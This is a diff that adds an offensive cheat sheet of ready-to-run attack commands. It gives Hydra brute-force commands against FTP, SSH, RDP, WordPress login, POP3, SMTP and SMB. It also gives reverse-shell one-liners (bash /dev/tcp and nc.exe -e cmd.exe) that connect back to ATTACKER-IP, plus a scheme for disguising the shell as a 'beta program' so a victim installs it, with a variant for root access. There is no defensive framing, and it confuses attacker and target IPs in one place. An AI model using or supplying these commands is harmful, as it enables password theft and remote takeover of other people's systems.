@@ -1,0 +1,93 @@
+--> Cheat sheet <--
+
+** Common password attacks you can do against a server. You can find more online
+
+
+The syntax for Hydra is
+	hydra -L <USERNAME_LIST> -P <PASSWORD_LIST> <TARGET_IP> <PROTOCOL>
+
+
+Password attack FTP with user admin and rockyou.txt password list
+	hydra -t 1 -l admin -P rockyou.txt $ip ftp
+
+
+Password attack SSH (Remote Access) with list of users and list of passwords
+	hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
+
+
+Password attack SSH (Remote Access) with known username and list of passwords
+	hydra -l username -P wordlist.txt host_ip ssh
+
+
+Password attack RDP (Remote Access Windows)
+	hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
+
+
+Password attack WordPress
+	hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+
+Password attack POP3
+	hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
+
+
+Password attack SMTP
+	hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
+
+
+Password attack SMB(Samba)
+	hydra -L usernames.txt -P passwords.txt $ip smb -V -f
+
+
+
+
+
+
+
+--> REVERSE SHELL <--
+
+Commands
+
+To know your IP address, type
+
+	ifconfig # linux, mac
+	ipconfig # windows
+
+To setup a listener
+
+	nc -lvp 4444
+
+To connect to listener (inside a script)
+
+	bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1
+
+where ATTACKER-IP is the ip address of your target computer. Port should be the same as on attacker box, in this case 4444 but you can pick anyone.
+
+If you are not in the same network, this should be your VPS IP (you can rent a VPS with Kali Linux). If you're on the same network, it can be your network IP.
+
+You can add the command above to a bash script (or inside an existing one)
+
+	chmod +x bad.sh   # make script executable
+	./bad.sh          # run script
+
+For Windows (using netcat)
+	
+	nc.exe ATTACKER-IP ATTACKER-PORT -e cmd.exe
+
+
+Hacking Linux Machine
+
+Linux computer install a beta program and this program will connect to Attacker Server. Attacker Server will have complete access to Vistim's Linux Machine. 
+
+For Setting up Server
+
+	nc -lvp PORTNUMBER
+
+At Target Linux Machine, run Script
+	
+	#!/bin/bash
+	bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1
+	# sudo bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1	# For Root access
+
+	
+
